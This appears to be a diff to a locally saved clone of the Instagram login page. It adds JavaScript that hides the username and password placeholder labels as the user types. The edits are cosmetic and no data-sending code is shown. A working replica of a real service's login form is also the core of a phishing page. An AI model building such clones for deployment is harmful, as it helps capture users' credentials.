@@ -12164,6 +12164,17 @@
     <!-- <script type="text/javascript" as="script" crossorigin="anonymous" charset="utf-8" async="" src="./Login • Instagram_files/7f764566736a.js"></script> -->
     <link href="./Login • Instagram_files/8acb7a798e78.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
 </head>
+<script>
+    function hide_name() {
+        console.log('hello');
+        document.getElementById('typing_name').style.display = 'none';
+    }
+
+    function hide_pass() {
+        console.log('world')
+        document.getElementById('typing_pass').style.display = 'none';
+    }
+</script>
 
 <body class="" style="">
 
@@ -12180,12 +12191,12 @@
                                     <form class="HmktE" method="post">
                                         <div class="                   Igw0E     IwRSH      eGOV_         _4EzTm        FBi-h                                                                                                      "></div>
                                         <div class="-MzZI">
-                                            <div class="_9GP1n   "><label class="f0n8F "><span class="_9nyy2">Phone number, username, or email</span><input aria-label="Phone number, username, or email" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="75" name="username" type="text" class="_2hvTZ pexuQ zyHYP" value=""></label>
+                                            <div class="_9GP1n   "><label class="f0n8F "><span id='typing_name' class="_9nyy2">Phone number, username, or email</span><input onkeypress="hide_name()"  aria-label="Phone number, username, or email" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="75" name="username" type="text" class="_2hvTZ pexuQ zyHYP" value=""></label>
                                                 <div class="i24fI"></div>
                                             </div>
                                         </div>
                                         <div class="-MzZI">
-                                            <div class="_9GP1n   "><label class="f0n8F "><span class="_9nyy2">Password</span><input aria-label="Password" aria-required="true" autocapitalize="off" autocorrect="off" name="password" type="password" class="_2hvTZ pexuQ zyHYP" value=""></label>
+                                            <div class="_9GP1n   "><label class="f0n8F "><span id='typing_pass' class="_9nyy2">Password</span><input  onkeypress="hide_pass()" aria-label="Password" aria-required="true" autocapitalize="off" autocorrect="off" name="password" type="password" class="_2hvTZ pexuQ zyHYP" value=""></label>
                                                 <div class="i24fI"></div>
                                             </div>
                                         </div>
